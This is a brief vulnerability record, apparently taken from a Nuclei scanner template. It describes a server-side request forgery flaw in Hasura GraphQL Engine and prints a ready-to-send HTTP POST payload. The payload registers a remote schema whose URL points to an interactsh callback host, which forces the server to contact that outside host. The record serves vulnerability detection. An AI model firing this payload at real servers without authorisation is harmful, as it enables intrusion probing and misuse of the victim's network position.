# Vulnerability: Hasura GraphQL Engine - Server Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`hasura-graphql-ssrf.yaml`)

## Description
Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery )

## Vulnerable Code Pattern / Exploit Payload
```http
POST /v1/query HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: */*

{
   "type":"bulk",
   "args":[
      {
         "type":"add_remote_schema",
         "args":{
            "name":"test",
            "definition":{
               "url":"https://{{interactsh-url}}",
               "headers":[
               ],
               "timeout_seconds":60,
               "forward_client_headers":true
            }
         }
      }
   ]
}
```

